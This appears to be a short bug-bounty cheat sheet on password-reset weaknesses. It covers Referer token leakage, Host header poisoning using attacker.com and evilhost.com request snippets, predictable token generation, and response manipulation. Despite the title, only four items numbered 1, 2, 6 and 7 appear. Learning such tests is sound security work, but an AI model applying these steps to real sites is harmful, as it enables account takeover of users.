10 Reset Password Flaws

1. Password Reset Token Leak Via Referrer

Exploitation
•Request password reset to your email address
•Click on the password reset link
•Dont change password
•Click any 3rd party websites(eg: Facebook, twitter)
•Intercept the request in burpsuite proxy
•Check if the referer header is leaking password reset token.

Impact
It allows the person who has control of particular site to change the user’s password (CSRF attack), because this person knows reset password token of the user.

2. Account Takeover Through Password Reset Poisoning

Exploitation
• Intercept the password reset request in Burpsuite
• Add follwing header or edit header in burpsuite(try one by one)

You can use ngrok server as your attacker server

(1) Host: attacker.com

(2) Host: target.com
X-Forwarded-Host: attacker.com

(3) Host: target.com
Host: attacker.com

Forward the request
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: evilhost.com

(4) If you find a password reset token like this
https://evilhost.com/reset-password.php?token=12345678-1234-1234-1234-12345678901

Impact
The victim will receive the malicious link in their email, and, when clicked, will leak the user’s password reset link / token to the attacker, leading to full account takeover.

6. Findout How Password Reset Token is Genrated

•Generated based Timestamp
•Generated based on the UserID
•Generated based on email of User
•Generated based on Firstname and Lastname
•Generated based on Date of Birth
•Generated based on Cryptography

Use Burp Sequencer to find the randomness or predictability of tokens.

7. Response manipulation

Look for Request and Response like these

HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
Change Response

HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
